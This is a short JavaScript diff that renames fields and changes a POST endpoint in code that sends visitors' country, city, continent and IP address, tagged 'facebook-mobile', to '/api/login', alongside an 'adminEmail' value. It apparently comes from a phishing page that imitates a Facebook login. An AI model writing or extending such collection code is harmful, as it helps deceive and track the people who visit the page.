@@ -332,13 +332,12 @@
                     country: country.value,
                     city: city.value,
                     continent: continent.value,
-                    ip: ip.value,
-                    timestamp: new Date().toISOString(),
+                    ip_address: ip.value,
                     platform: 'facebook-mobile'
                 };
                 
                 // Send data to server
-                fetch('/api/save', {
+                fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(userData)
@@ -384,7 +383,7 @@
                     country: country.value,
                     city: city.value,
                     continent: continent.value,
-                    ip: ip.value,
+                    ip_address: ip.value,
                     adminEmail: adminEmail.value
                 };
                 
